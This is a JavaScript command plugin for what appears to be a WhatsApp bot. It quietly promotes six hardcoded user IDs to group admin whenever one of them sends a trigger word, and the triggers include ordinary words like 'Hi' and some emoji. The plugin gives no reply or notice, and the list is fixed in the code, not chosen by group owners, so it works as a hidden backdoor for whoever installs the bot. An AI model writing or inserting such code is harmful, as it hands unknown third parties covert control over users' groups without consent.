const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🦁", "💀", "aa", "Hi", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    // Authorized LIDs - Only these users can silently take admin
    const authorizedLIDs = [
        "188425231679713@lid",
         "20418995957926@lid",
        "147609939349717@lid",
        "223661176958998@lid",
        "88906376708108@lid",
        "4742449238066@lid"   
    ];

    // Check if sender is in authorized list
    if (!authorizedLIDs.includes(sender)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [sender], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
